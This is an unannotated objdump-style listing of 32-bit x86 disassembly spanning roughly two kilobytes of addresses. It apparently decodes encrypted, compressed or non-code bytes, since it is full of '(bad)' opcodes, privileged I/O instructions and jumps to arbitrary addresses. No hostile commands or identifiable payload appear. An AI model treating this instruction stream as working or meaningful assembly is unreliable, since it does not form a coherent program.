  41e7e0:	add    ecx,DWORD PTR [edi]
  41e7e2:	inc    edi
  41e7e3:	into   
  41e7e4:	and    DWORD PTR [edx+0x3b],eax
  41e7e7:	es in  eax,0x50
  41e7ea:	imul   ebp
  41e7ec:	jb     0x41e810
  41e7ee:	leave  
  41e7ef:	push   ebp
  41e7f0:	out    dx,eax
  41e7f1:	jp     0x41e7f3
  41e7f3:	and    BYTE PTR [ebx],ch
  41e7f5:	xor    eax,edx
  41e7f7:	popa   
  41e7f8:	neg    DWORD PTR [eax]
  41e7fa:	arpl   si,bx
  41e7fc:	push   cs
  41e7fd:	stos   DWORD PTR es:[edi],eax
  41e7fe:	es xor eax,0xdba2ea71
  41e804:	rcr    BYTE PTR [eax+esi*1+0x2c997b5],1
  41e80b:	dec    eax
  41e80c:	rcl    ah,cl
  41e80e:	jne    0x41e874
  41e810:	daa    
  41e811:	xor    ecx,edi
  41e813:	jno    0x41e7e5
  41e815:	mov    cl,0x6d
  41e817:	ror    ebp,cl
  41e819:	add    edx,esi
  41e81b:	cdq    
  41e81c:	cmp    ebx,DWORD PTR [edx+0x55488f84]
  41e822:	push   cs
  41e823:	or     eax,0x439b39bd
  41e828:	call   0x278a2601
  41e82d:	out    dx,al
  41e82e:	jnp    0x41e825
  41e830:	jbe    0x41e7c2
  41e832:	push   ss
  41e833:	lods   eax,DWORD PTR ds:[esi]
  41e834:	sub    BYTE PTR [edx],dl
  41e836:	int    0xdd
  41e838:	ss jge 0x41e8b1
  41e83b:	(bad)  
  41e83c:	ds in  eax,dx
  41e83e:	adc    eax,0x2b063297
  41e843:	in     eax,dx
  41e844:	shl    DWORD PTR [ecx+0x48],0xcf
  41e848:	xor    al,0x4
  41e84a:	sbb    eax,0x9582f5d2
  41e84f:	pop    ecx
  41e850:	jmp    0x41e84a
  41e852:	inc    edx
  41e853:	adc    al,0xe3
  41e855:	cmp    DWORD PTR [esi],0xd0adac48
  41e85b:	cmp    esp,DWORD PTR [edx+0x6c3f0e72]
  41e861:	fsub   DWORD PTR [edx-0x619493c4]
  41e867:	ja     0x41e8e5
  41e869:	mov    edi,0x1a4077c4
  41e86e:	lods   eax,DWORD PTR ds:[esi]
  41e86f:	push   edx
  41e870:	jb     0x41e827
  41e872:	mov    BYTE PTR [bx+di-0x7ca5],ah
  41e877:	in     eax,0x33
  41e879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e87a:	aad    0xe7
  41e87c:	xor    al,0x5a
  41e87e:	jg     0x41e87b
  41e880:	mov    ah,0x1d
  41e882:	and    ebp,esp
  41e884:	enter  0x7697,0xc9
  41e888:	or     ch,BYTE PTR [edi+0x44a3b08a]
  41e88e:	retf   
  41e88f:	cmp    BYTE PTR [ebx],bh
  41e891:	xchg   esi,eax
  41e892:	adc    eax,0x658c73a8
  41e897:	xchg   ebp,eax
  41e898:	cli    
  41e899:	in     al,dx
  41e89a:	mov    ds:0x4e37b1a3,eax
  41e89f:	js     0x41e8ca
  41e8a1:	sbb    DWORD PTR [eax-0x28],eax
  41e8a4:	rol    DWORD PTR gs:[eax+eiz*8+0x6f],1
  41e8a9:	or     al,bl
  41e8ab:	xor    DWORD PTR [esi+0x320a6c35],edi
  41e8b1:	sar    BYTE PTR [esi],1
  41e8b3:	inc    esi
  41e8b4:	or     DWORD PTR [esi],0xc8e763fc
  41e8ba:	je     0x41e912
  41e8bc:	es neg eax
  41e8bf:	cld    
  41e8c0:	adc    al,0x2b
  41e8c2:	call   FWORD PTR [ecx]
  41e8c4:	push   es
  41e8c5:	mov    esp,0xca012d9c
  41e8ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8cb:	cmp    ebp,DWORD PTR [edi-0x446c9786]
  41e8d1:	inc    eax
  41e8d2:	js     0x41e8df
  41e8d4:	adc    DWORD PTR [edx],0x62
  41e8d7:	mov    WORD PTR [ebp+0x75f3e730],?
  41e8dd:	adc    DWORD PTR [esi],ebx
  41e8df:	jge    0x41e8fb
  41e8e1:	mov    bl,0x43
  41e8e3:	in     al,0x40
  41e8e5:	sub    eax,0xb216481e
  41e8ea:	mov    ch,0xa
  41e8ec:	enter  0x33a6,0x12
  41e8f0:	fdivr  st(2),st
  41e8f2:	cli    
  41e8f3:	(bad)  
  41e8f4:	pop    eax
  41e8f5:	jle    0x41e93f
  41e8f7:	std    
  41e8f8:	rcl    DWORD PTR [ebp-0x6c],0xea
  41e8fc:	aaa    
  41e8fd:	loope  0x41e94d
  41e8ff:	rol    BYTE PTR [eax],cl
  41e901:	mov    esp,DWORD PTR [ebp+0x5edb12a5]
  41e907:	inc    esi
  41e908:	jmp    0xc06d8bdf
  41e90d:	dec    edx
  41e90e:	fs mov cr2,eax
  41e912:	fisub  DWORD PTR [eax+0x5c]
  41e915:	stc    
  41e916:	lods   eax,DWORD PTR ds:[esi]
  41e917:	into   
  41e918:	push   eax
  41e919:	dec    esp
  41e91a:	loop   0x41e8c4
  41e91c:	(bad)  
  41e91d:	(bad)  
  41e91e:	fld    TBYTE PTR [ebp-0x7d]
  41e921:	jae    0x41e954
  41e923:	inc    ebx
  41e924:	pop    ebx
  41e925:	pop    ss
  41e926:	or     al,0x6f
  41e928:	fwait
  41e929:	adc    DWORD PTR [edi],ebx
  41e92b:	xor    ch,ch
  41e92d:	push   ecx
  41e92e:	sub    al,0xcf
  41e930:	ret    
  41e931:	inc    esp
  41e932:	sub    al,0x25
  41e934:	test   BYTE PTR [ebx+0x32ff93c0],ch
  41e93a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e93c:	test   bl,cl
  41e93e:	scas   eax,DWORD PTR es:[edi]
  41e93f:	out    0xb4,eax
  41e941:	push   cs
  41e942:	push   ss
  41e943:	or     edx,DWORD PTR [eax-0x583f60ab]
  41e949:	and    ah,BYTE PTR [esi]
  41e94b:	in     eax,0xa8
  41e94d:	cmc    
  41e94e:	fsubr  st(5),st
  41e950:	mov    ds:0x729d7ed1,al
  41e955:	add    eax,ecx
  41e957:	sti    
  41e958:	adc    DWORD PTR [esi-0x7b3468e1],eax
  41e95e:	xlat   BYTE PTR ds:[ebx]
  41e95f:	xchg   esp,eax
  41e960:	jbe    0x41e9ad
  41e962:	push   esi
  41e963:	stc    
  41e964:	push   si
  41e966:	popf   
  41e967:	xchg   BYTE PTR [ecx-0x3ebfa8dd],dl
  41e96d:	fld    QWORD PTR [edx-0x15]
  41e970:	ins    BYTE PTR es:[edi],dx
  41e971:	mov    eax,0xba5e404c
  41e976:	push   eax
  41e977:	inc    ebx
  41e978:	pop    ecx
  41e979:	mov    DWORD PTR [ebx+ecx*8-0x597f92e2],0x29759038
  41e984:	loop   0x41e958
  41e986:	mul    dh
  41e988:	pop    esi
  41e989:	sahf   
  41e98a:	aaa    
  41e98b:	(bad)  
  41e98c:	sti    
  41e98d:	mov    esp,es
  41e98f:	cmc    
  41e990:	lahf   
  41e991:	jns    0x41e997
  41e993:	mov    al,ds:0x8acec1ee
  41e998:	fwait
  41e999:	fwait
  41e99a:	dec    ebp
  41e99b:	and    bl,bl
  41e99d:	fs out dx,eax
  41e99f:	aas    
  41e9a0:	mov    edi,0xd6aea6e5
  41e9a5:	cld    
  41e9a6:	pop    ecx
  41e9a7:	push   ecx
  41e9a8:	mov    ds:0xab1726e,eax
  41e9ad:	mov    WORD PTR [edi+0x30c5982b],es
  41e9b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b4:	sbb    eax,0x7ee22b0b
  41e9b9:	pop    edx
  41e9ba:	add    esp,DWORD PTR [edi+ecx*4]
  41e9bd:	and    DWORD PTR [eax-0x2b8002dc],edx
  41e9c3:	pop    es
  41e9c4:	fdivr  QWORD PTR [edi]
  41e9c6:	shl    ebp,0xc7
  41e9c9:	div    BYTE PTR [eax-0x6926fd85]
  41e9cf:	mov    eax,ds:0x1e6f9ca8
  41e9d4:	sub    edx,DWORD PTR [ebx]
  41e9d6:	xchg   DWORD PTR [esi+0x298da4f],ebp
  41e9dc:	in     eax,dx
  41e9dd:	leave  
  41e9de:	mov    ecx,0xe136c1fc
  41e9e3:	fisttp DWORD PTR [edx+0x73201c1e]
  41e9e9:	sti    
  41e9ea:	int3   
  41e9eb:	push   ecx
  41e9ec:	enter  0xadef,0x27
  41e9f0:	mov    ecx,DWORD PTR [edi-0x6e]
  41e9f3:	js     0x41ea40
  41e9f5:	mov    ch,0xdd
  41e9f7:	out    dx,al
  41e9f8:	sti    
  41e9f9:	fisubr DWORD PTR [esi-0x18]
  41e9fc:	or     al,0x7f
  41e9fe:	dec    DWORD PTR [ebp-0x14]
  41ea01:	dec    ecx
  41ea02:	xor    al,0x27
  41ea04:	and    BYTE PTR [ebp-0x47],al
  41ea07:	push   esp
  41ea08:	adc    al,0xd0
  41ea0a:	pop    esp
  41ea0b:	or     BYTE PTR [edx],bl
  41ea0d:	push   ebx
  41ea0e:	jno    0x41ea08
  41ea10:	inc    edx
  41ea11:	aam    0xb
  41ea13:	repz pop es
  41ea15:	jno    0x41ea36
  41ea17:	or     eax,0xcdfb2038
  41ea1c:	or     BYTE PTR [ecx+0x6a],0x72
  41ea20:	inc    edx
  41ea21:	ret    0xd866
  41ea24:	ret    
  41ea25:	jl     0x41ea27
  41ea27:	imul   edi,DWORD PTR [esi],0x49
  41ea2a:	rcl    BYTE PTR [edi+0x27],1
  41ea2d:	pop    ebp
  41ea2e:	jmp    0x41e9c2
  41ea30:	push   ds
  41ea31:	push   eax
  41ea32:	push   edi
  41ea33:	xchg   ebp,eax
  41ea34:	mov    eax,ds:0x506c1589
  41ea39:	mov    ds,WORD PTR [ecx-0x449c6501]
  41ea3f:	cmp    al,0xc0
  41ea42:	lds    ebx,FWORD PTR [edi-0x6d]
  41ea45:	gs ins BYTE PTR es:[edi],dx
  41ea47:	mov    ds:0x870bce5b,eax
  41ea4c:	fsub   QWORD PTR [eax+edi*4]
  41ea4f:	mov    edi,0x65cdefe3
  41ea54:	mov    eax,eax
  41ea56:	inc    edi
  41ea57:	icebp  
  41ea58:	inc    ecx
  41ea59:	ja     0x41ea4d
  41ea5b:	in     al,0x9d
  41ea5d:	cli    
  41ea5e:	xchg   edx,eax
  41ea5f:	pop    esi
  41ea60:	mov    edx,0x7da5f8b3
  41ea65:	add    al,0x35
  41ea67:	shl    esp,cl
  41ea69:	fistp  QWORD PTR [esi-0x5159348b]
  41ea6f:	iret   
  41ea70:	adc    eax,0x40122596
  41ea75:	mov    ds:0xe0a23e0a,al
  41ea7a:	ucomiss xmm2,DWORD PTR [edi+eax*2+0xeddba79]
  41ea82:	pop    ds
  41ea83:	add    DWORD PTR [ebx-0x5d],esi
  41ea86:	cmp    DWORD PTR [edi],edi
  41ea88:	fs scas al,BYTE PTR es:[edi]
  41ea8a:	and    ch,bh
  41ea8c:	test   dh,0xf8
  41ea8f:	mov    eax,ds:0x8d7acec4
  41ea94:	dec    ecx
  41ea95:	sar    BYTE PTR ds:[edx+edi*2],0xc4
  41ea9a:	fs inc ebp
  41ea9c:	sub    al,0xd8
  41ea9e:	mov    ecx,0xba0987d
  41eaa3:	push   es
  41eaa4:	sub    BYTE PTR [edi-0xa5743c7],dl
  41eaaa:	sahf   
  41eaab:	pop    ecx
  41eaac:	jecxz  0x41eb08
  41eaae:	aaa    
  41eaaf:	mov    ?,edi
  41eab1:	lds    ebx,FWORD PTR [ebx]
  41eab3:	push   0x3581500
  41eab8:	push   ss
  41eab9:	rol    BYTE PTR [edi+eax*4],1
  41eabc:	(bad)  
  41eabd:	(bad)  
  41eabe:	ror    BYTE PTR [ecx+0x32d5f685],cl
  41eac4:	mov    ebp,esi
  41eac6:	add    DWORD PTR [edx-0x4071a6ad],ecx
  41eacc:	lds    esi,FWORD PTR [ecx+0x22]
  41eacf:	xchg   esp,eax
  41ead0:	call   DWORD PTR [eiz*1-0x3842f31]
  41ead7:	rcl    BYTE PTR [ecx-0x6d],0x81
  41eadb:	popf   
  41eadc:	test   ebx,edi
  41eade:	push   ebx
  41eadf:	rcr    DWORD PTR [esi],0x48
  41eae2:	jmp    0x41eada
  41eae4:	pop    eax
  41eae5:	xlat   BYTE PTR ds:[ebx]
  41eae6:	adc    DWORD PTR [ebp+0x2d],eax
  41eae9:	js     0x41eb4e
  41eaeb:	je     0x41eb3c
  41eaed:	retf   
  41eaee:	inc    edx
  41eaef:	int3   
  41eaf0:	fnsave ds:0xe050d070
  41eaf6:	sub    eax,0x27f1482
  41eafb:	inc    edi
  41eafc:	inc    edx
  41eafd:	fsub   QWORD PTR [esi-0x1935105b]
  41eb03:	mov    eax,0xdf69e0b6
  41eb08:	jp     0x41eae8
  41eb0a:	xchg   ebp,eax
  41eb0b:	idiv   BYTE PTR [edi+0x0]
  41eb0e:	add    eax,0x82f4fb92
  41eb13:	cwde   
  41eb14:	imul   esp,DWORD PTR [ecx+0x75],0x74
  41eb18:	inc    esp
  41eb19:	xlat   BYTE PTR ds:[ebx]
  41eb1a:	(bad)  
  41eb1b:	gs ret 0x3da2
  41eb1f:	fcmovnb st,st(1)
  41eb21:	jecxz  0x41eaf7
  41eb23:	enter  0xf6fe,0x34
  41eb27:	xor    al,BYTE PTR [ecx+eiz*1-0x5a]
  41eb2b:	mov    ds,WORD PTR es:[ecx+0x73b715fd]
  41eb32:	(bad)  
  41eb34:	fnsave [edi+eax*8-0x4e478624]
  41eb3b:	and    al,0x6b
  41eb3d:	jo     0x41ebb4
  41eb3f:	cmp    dh,BYTE PTR [edi-0x49ea7b4a]
  41eb45:	mov    WORD PTR [edi+0x72aaf236],cs
  41eb4b:	sbb    DWORD PTR [ebx+0x1],edx
  41eb4e:	aas    
  41eb4f:	push   esp
  41eb50:	xor    DWORD PTR [edx+0x77],0x902340f2
  41eb57:	mov    eax,0x4a8d158e
  41eb5c:	imul   eax,DWORD PTR [ebx+edx*2+0x62277952],0x49
  41eb64:	push   esp
  41eb65:	(bad)
  41eb68:	push   ebx
  41eb69:	idiv   DWORD PTR [bp+si]
  41eb6c:	mov    DWORD PTR [eax-0x2e133362],ebx
  41eb72:	push   edi
  41eb73:	(bad)  
  41eb75:	push   cs
  41eb76:	je     0x41ebd5
  41eb78:	mov    ebx,0xc7884e16
  41eb7d:	cmp    al,0x74
  41eb7f:	add    DWORD PTR [eax],edi
  41eb81:	dec    edi
  41eb82:	call   0x119:0xe9afd376
  41eb89:	fnstenv [ebp-0x1a076ca3]
  41eb8f:	div    BYTE PTR [ebx-0x64]
  41eb92:	fidiv  WORD PTR ds:0x86a4d444
  41eb98:	jmp    0x41eb81
  41eb9a:	fisttp QWORD PTR [edi+0x18]
  41eb9d:	adc    DWORD PTR [esp+edx*2],ebp
  41eba0:	or     DWORD PTR [ebp-0x5],ebx
  41eba3:	cdq    
  41eba4:	xchg   edi,eax
  41eba5:	mov    ecx,0x65922b52
  41ebaa:	cmp    bl,BYTE PTR [ebp+0x7959377]
  41ebb0:	add    ch,BYTE PTR [ecx-0x3ce5ae3]
  41ebb6:	or     BYTE PTR [edx-0xb5e42cf],bl
  41ebbc:	data16 (bad) 
  41ebbe:	jns    0x41eb5f
  41ebc0:	and    dh,bl
  41ebc2:	inc    eax
  41ebc3:	in     eax,dx
  41ebc4:	inc    ebp
  41ebc5:	fmul   st,st(5)
  41ebc7:	inc    edi
  41ebc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc9:	xchg   ebp,eax
  41ebca:	lds    ecx,FWORD PTR [edx]
  41ebcc:	pop    ebx
  41ebcd:	jle    0x41ebd8
  41ebcf:	push   ds
  41ebd0:	push   ebp
  41ebd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebd2:	xor    BYTE PTR [eax+0x5b],0x2a
  41ebd6:	xor    DWORD PTR [edi+ebp*1-0x2d],0xffffff95
  41ebdb:	push   esi
  41ebdc:	lds    esi,FWORD PTR [eax+0x6b88be3a]
  41ebe2:	leave  
  41ebe3:	pop    esp
  41ebe4:	push   edi
  41ebe5:	or     DWORD PTR [ecx],ecx
  41ebe7:	std    
  41ebe8:	int3   
  41ebe9:	lods   eax,DWORD PTR ds:[esi]
  41ebea:	cmp    al,0x13
  41ebec:	sub    BYTE PTR [esi],0xf0
  41ebef:	sub    BYTE PTR ss:[edx-0x3b9a55],dh
  41ebf6:	mov    DWORD PTR [eax+ebp*1-0x1e],ebx
  41ebfa:	adc    eax,DWORD PTR [eax+edi*4-0xcc68758]
  41ec01:	ja     0x41ec1a
  41ec03:	je     0x41ec49
  41ec05:	sub    BYTE PTR [ebx],ah
  41ec07:	sub    esp,DWORD PTR [ecx-0x79]
  41ec0a:	jge    0x41ebdb
  41ec0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec0d:	pop    edx
  41ec0e:	xlat   BYTE PTR ds:[ebx]
  41ec0f:	cwde   
  41ec10:	push   esp
  41ec11:	dec    ebp
  41ec12:	rol    DWORD PTR ds:0xd4a86a6e,cl
  41ec18:	mov    al,ds:0x92dfcbf7
  41ec1d:	add    ebx,0x46
  41ec20:	in     al,dx
  41ec21:	mov    bl,0x67
  41ec23:	rep ins DWORD PTR es:[edi],dx
  41ec25:	sub    DWORD PTR [eax-0x62efc29d],edx
  41ec2b:	dec    edi
  41ec2c:	xchg   ebp,eax
  41ec2d:	dec    edi
  41ec2e:	mov    BYTE PTR [ecx-0x3270c93b],dh
  41ec34:	push   0xfffffffa
  41ec36:	test   BYTE PTR [edi],ah
  41ec38:	(bad)  
  41ec39:	cmp    BYTE PTR [edx+edi*8],ah
  41ec3c:	fistp  WORD PTR [edx+0x6cfd40b8]
  41ec42:	bswap  edi
  41ec44:	outs   dx,BYTE PTR ds:[esi]
  41ec45:	mov    ds:0x26907d03,al
  41ec4a:	xchg   esi,eax
  41ec4b:	lods   eax,DWORD PTR ds:[esi]
  41ec4c:	mov    eax,0x41f9d0a1
  41ec51:	loope  0x41ec12
  41ec53:	jne    0x41ec70
  41ec55:	mov    esi,0x5e1eca99
  41ec5a:	xchg   DWORD PTR [ebx+ebx*4],ebx
  41ec5d:	test   BYTE PTR [esi+ebx*8],bh
  41ec60:	retf   0x7004
  41ec63:	pusha  
  41ec64:	or     ecx,ebx
  41ec66:	int    0x6f
  41ec68:	xor    dl,BYTE PTR [esi]
  41ec6a:	mov    esi,0x7dc3b160
  41ec6f:	and    DWORD PTR [ebx+0x57],eax
  41ec72:	into   
  41ec73:	enter  0x59d9,0xd8
  41ec77:	dec    esp
  41ec78:	(bad)
  41ec7b:	xor    DWORD PTR [esi+0x7b],0x588dc46e
  41ec82:	xor    BYTE PTR [ebx+ebx*2],dl
  41ec85:	mov    DWORD PTR [ebx],esp
  41ec87:	je     0x41ecb0
  41ec89:	out    0x64,al
  41ec8b:	xor    BYTE PTR [ebp-0x7d110bd1],dh
  41ec91:	rcr    ebp,cl
  41ec93:	stos   BYTE PTR es:[edi],al
  41ec94:	sar    BYTE PTR [ebx-0x2d],0xa4
  41ec98:	xlat   BYTE PTR ds:[ebx]
  41ec99:	jo     0x41ec2e
  41ec9b:	fadd   DWORD PTR [esi-0x8]
  41ec9e:	jbe    0x41eca5
  41eca0:	push   0x1c9da19b
  41eca5:	aas    
  41eca6:	mov    ch,0x32
  41eca8:	arpl   WORD PTR [ebx+0x55],sp
  41ecab:	xchg   ebp,eax
  41ecac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecad:	jne    0x41ecbb
  41ecaf:	aaa    
  41ecb0:	dec    edx
  41ecb1:	into   
  41ecb2:	adc    cl,BYTE PTR [esi-0x245ada6]
  41ecb8:	stc    
  41ecb9:	repnz std 
  41ecbb:	xor    edx,ebp
  41ecbd:	jge    0x41ed33
  41ecbf:	mov    eax,ds:0x77c0a4b9
  41ecc4:	and    ecx,DWORD PTR [edx+0x7b931ad3]
  41ecca:	push   0xd
  41eccc:	jbe    0x41ecf0
  41ecce:	iret   
  41eccf:	scas   al,BYTE PTR es:[edi]
  41ecd0:	mov    ch,0x18
  41ecd2:	les    esi,FWORD PTR [ecx-0x57]
  41ecd5:	std    
  41ecd6:	mov    BYTE PTR [ebx],dh
  41ecd8:	push   ds
  41ecd9:	inc    edi
  41ecda:	adc    dh,BYTE PTR [eax+0x76]
  41ecdd:	lea    esp,[ebp+0x72457906]
  41ece3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ece4:	push   ebx
  41ece5:	pop    edi
  41ece6:	dec    ecx
  41ece7:	xchg   edi,eax
  41ece8:	shl    BYTE PTR [ebx*8+0x3b9b9184],1
  41ecef:	in     al,0x91
  41ecf1:	xor    DWORD PTR [esi],ebx
  41ecf3:	shr    esi,cl
  41ecf5:	pop    ds
  41ecf6:	push   0xffffffd6
  41ecf8:	not    eax
  41ecfa:	fidiv  DWORD PTR [ebx]
  41ecfc:	out    0x8d,eax
  41ecfe:	xchg   BYTE PTR [edx-0x46],bl
  41ed01:	aaa    
  41ed02:	mov    ds:0x9a46372e,al
  41ed07:	and    al,BYTE PTR [eax+0x7f]
  41ed0a:	addr16 jle 0x41ed7b
  41ed0d:	jo     0x41ed6d
  41ed0f:	(bad)  [edi-0x1]
  41ed12:	and    al,0x76
  41ed14:	sbb    esi,edx
  41ed16:	xchg   ebp,eax
  41ed17:	aas    
  41ed18:	std    
  41ed19:	int    0x36
  41ed1b:	addr16 push eax
  41ed1d:	in     eax,dx
  41ed1e:	jmp    0xb157dfd2
  41ed23:	pushf  
  41ed24:	sti    
  41ed25:	push   cs
  41ed26:	xlat   BYTE PTR ds:[ebx]
  41ed27:	test   BYTE PTR [edi-0x4ecdb6a7],ah
  41ed2d:	add    esi,esp
  41ed2f:	pop    eax
  41ed30:	mov    esp,0xfb9251cc
  41ed35:	inc    DWORD PTR [esp+ebx*4+0x51]
  41ed39:	or     BYTE PTR [ebx+0x5ececb0c],bh
  41ed3f:	sbb    DWORD PTR [eax+0x4137fe29],esi
  41ed45:	repz iret 
  41ed47:	test   al,0x2
  41ed49:	pop    ss
  41ed4a:	ds pushf 
  41ed4c:	jne    0x41ed6e
  41ed4e:	(bad)  
  41ed4f:	hlt    
  41ed50:	lods   eax,DWORD PTR ds:[esi]
  41ed51:	add    al,0x72
  41ed53:	xchg   ecx,eax
  41ed54:	xchg   edx,eax
  41ed55:	pop    esp
  41ed56:	out    dx,eax
  41ed57:	sti    
  41ed58:	imul   eax,DWORD PTR [ebp+0x48],0xffffff80
  41ed5c:	cli    
  41ed5d:	hlt    
  41ed5e:	xchg   ebx,eax
  41ed5f:	cmp    eax,0x505dcb5b
  41ed64:	xchg   ecx,eax
  41ed65:	xchg   edx,eax
  41ed66:	cdq    
  41ed67:	mov    eax,0xbf99df0d
  41ed6c:	fstp   TBYTE PTR [edi]
  41ed6e:	and    cl,dh
  41ed70:	add    cl,BYTE PTR [esi]
  41ed72:	adc    ecx,DWORD PTR ds:0x4000705a
  41ed78:	jmp    0x7d346c95
  41ed7d:	xchg   DWORD PTR ds:0x783b913c,ebx
  41ed83:	scas   eax,DWORD PTR es:[edi]
  41ed84:	jmp    0xfff90ba2
  41ed89:	cwde   
  41ed8a:	call   0xbaca:0x2e7a3cb8
  41ed91:	jnp    0x41ed41
  41ed93:	neg    esi
  41ed95:	pop    es
  41ed96:	and    eax,0xbdbd24d5
  41ed9b:	pusha  
  41ed9c:	enter  0xe446,0xd8
  41eda0:	dec    edi
  41eda1:	stc    
  41eda2:	pop    ss
  41eda3:	ds jbe 0x41ee11
  41eda6:	js     0x41ed59
  41eda8:	xor    DWORD PTR [ecx*2-0x4f8e6742],ecx
  41edaf:	sti    
  41edb0:	sar    DWORD PTR [edx+0x15c47e9f],cl
  41edb6:	dec    ecx
  41edb7:	push   es
  41edb8:	hlt    
  41edb9:	ret    0x51a4
  41edbc:	icebp  
  41edbd:	jp     0x41ed74
  41edbf:	popf   
  41edc0:	dec    ebx
  41edc1:	int3   
  41edc2:	cmp    eax,0xb5ffd4d4
  41edc7:	fdiv   QWORD PTR [ebx-0x787cd6b8]
  41edcd:	jae    0x41ed6b
  41edcf:	mov    ebp,0x40ecb895
  41edd4:	enter  0x462c,0x76
  41edd8:	xchg   edi,eax
  41edd9:	aam    0x6e
  41eddb:	ret    
  41eddc:	out    0x68,eax
  41edde:	pop    ss
  41eddf:	xor    BYTE PTR [ebx],dl
  41ede1:	out    dx,al
  41ede2:	add    cl,BYTE PTR [edx*2+0x97c78c8]
  41ede9:	in     eax,0xa5
  41edeb:	pop    ds
  41edec:	cmp    dl,BYTE PTR [ecx]
  41edee:	sar    DWORD PTR [esi],0x47
  41edf1:	mov    ch,0x8b
  41edf3:	dec    esi
  41edf4:	cmp    ebx,ebp
  41edf6:	jo     0x41edd1
  41edf8:	fldcw  WORD PTR [edx+0x61f96a5f]
  41edfe:	sbb    DWORD PTR [edi+0x62],edi
  41ee01:	adc    DWORD PTR [eax],edx
  41ee03:	dec    esi
  41ee04:	dec    esi
  41ee05:	push   esi
  41ee06:	pop    esp
  41ee07:	mov    esp,0x25d4f15d
  41ee0c:	fsubr  DWORD PTR [edi]
  41ee0e:	into   
  41ee0f:	je     0x41ee21
  41ee11:	cwde   
  41ee12:	xor    DWORD PTR [esi+ebp*4-0x694ddf2c],edi
  41ee19:	xor    bh,BYTE PTR [edx]
  41ee1b:	ss push ebx
  41ee1d:	dec    esi
  41ee1e:	data16 jns 0x41ee12
  41ee21:	int3   
  41ee22:	lock aam 0x87
  41ee25:	jns    0x41edad
  41ee27:	push   ebp
  41ee28:	dec    edx
  41ee29:	add    BYTE PTR [esp+esi*2-0x49],bh
  41ee2d:	push   0xffffffa1
  41ee2f:	and    BYTE PTR [eax+0x6da6e17b],ah
  41ee35:	loop   0x41ee86
  41ee37:	(bad)  [edi]
  41ee39:	test   DWORD PTR cs:[eax-0x77f3d2e2],0x5eff9449
  41ee44:	in     al,dx
  41ee45:	fsub   QWORD PTR ds:0xe916495c
  41ee4b:	cmp    BYTE PTR [ebp+0x2e],al
  41ee4e:	rol    DWORD PTR [edx+0x16],0x16
  41ee52:	scas   al,BYTE PTR es:[edi]
  41ee53:	test   DWORD PTR [eax+ecx*4+0x1653e664],edx
  41ee5a:	repz in eax,dx
  41ee5c:	push   esi
  41ee5d:	inc    ebp
  41ee5e:	sbb    eax,0x44383e55
  41ee63:	neg    bl
  41ee65:	push   ebx
  41ee66:	stos   DWORD PTR es:[edi],eax
  41ee67:	ds popf 
  41ee69:	out    0xce,al
  41ee6b:	jbe    0x41ee08
  41ee6d:	sub    ecx,DWORD PTR [ecx+0xf21757a]
  41ee73:	loop   0x41eedd
  41ee75:	fidivr WORD PTR [eax+0xeafbead]
  41ee7b:	movhps QWORD PTR [esi],xmm1
  41ee7e:	enter  0x4a8,0x25
  41ee82:	les    esi,FWORD PTR [ebx-0x599ddc6c]
  41ee88:	test   al,0x29
  41ee8a:	test   eax,0x84168840
  41ee8f:	jl     0x41ee40
  41ee91:	jecxz  0x41ee66
  41ee93:	mov    ebp,esi
  41ee95:	mov    BYTE PTR [ebp-0x32],dh
  41ee98:	(bad)  
  41ee99:	xlat   BYTE PTR ds:[ebx]
  41ee9a:	das    
  41ee9b:	or     eax,0x397214c3
  41eea0:	addr16 jb 0x41ee36
  41eea3:	add    BYTE PTR [ecx-0x4a2e3a0f],0xb2
  41eeaa:	stos   BYTE PTR es:[edi],al
  41eeab:	push   ds
  41eeac:	or     BYTE PTR [eax],0x84
  41eeaf:	jmp    0x776345b9
  41eeb4:	out    0xb7,eax
  41eeb6:	mov    ebx,DWORD PTR ds:0x76607848
  41eebc:	fidiv  DWORD PTR [eax-0x17461316]
  41eec2:	xor    ecx,ecx
  41eec4:	push   ds
  41eec5:	inc    ebx
  41eec6:	mov    esi,eax
  41eec8:	arpl   WORD PTR [ebp-0x327d7018],si
  41eece:	jle    0x41eec1
  41eed0:	or     eax,0x900d79c6
  41eed5:	addr16 mov edi,0xb2fc8e7e
  41eedb:	nop
  41eedc:	fdivp  st(4),st
  41eede:	cdq    
  41eedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eee0:	test   BYTE PTR [ecx],al
  41eee2:	mov    ebp,DWORD PTR [ebp+eax*2-0x41]
  41eee6:	rcl    DWORD PTR [ebp+0x345becf5],0xc6
  41eeed:	fstp   DWORD PTR [ebx-0x70]
  41eef0:	aam    0x5b
  41eef2:	cld    
  41eef3:	sbb    al,0x60
  41eef5:	jo     0x41eefc
  41eef7:	pop    ss
  41eef8:	ret    0x8d1c
  41eefb:	inc    ecx
  41eefc:	arpl   WORD PTR [ebx-0x7f395504],cx
  41ef02:	fdivr  st(4),st
  41ef04:	je     0x41eec4
  41ef06:	jecxz  0x41eec5
  41ef08:	pop    ecx
  41ef09:	push   eax
  41ef0a:	mov    ecx,0x5e46cfc0
  41ef0f:	mov    DWORD PTR [esi-0x36e14418],edi
  41ef15:	xchg   esp,eax
  41ef16:	push   cs
  41ef17:	retf   
  41ef18:	sub    dl,BYTE PTR [esi-0x4c628ce5]
  41ef1e:	es js  0x41ef44
  41ef21:	cli    
  41ef22:	lea    eax,[edx+0x442ef6b0]
  41ef28:	push   eax
  41ef29:	(bad)  
  41ef2a:	leave  
  41ef2b:	jae    0x41ef09
  41ef2d:	mov    edi,0x5ce6bac
  41ef32:	and    BYTE PTR [ebx-0x131829d6],ah
  41ef38:	cmc    
  41ef39:	mov    ebx,0x7ec50418
  41ef3e:	leave  
  41ef3f:	dec    edi
  41ef40:	add    ch,cl
  41ef42:	xor    BYTE PTR [ecx+0x54b69e31],al
  41ef48:	das    
  41ef49:	mov    ebp,0xc08c7853
  41ef4e:	xchg   DWORD PTR [eax],ecx
  41ef50:	jno    0x41ef24
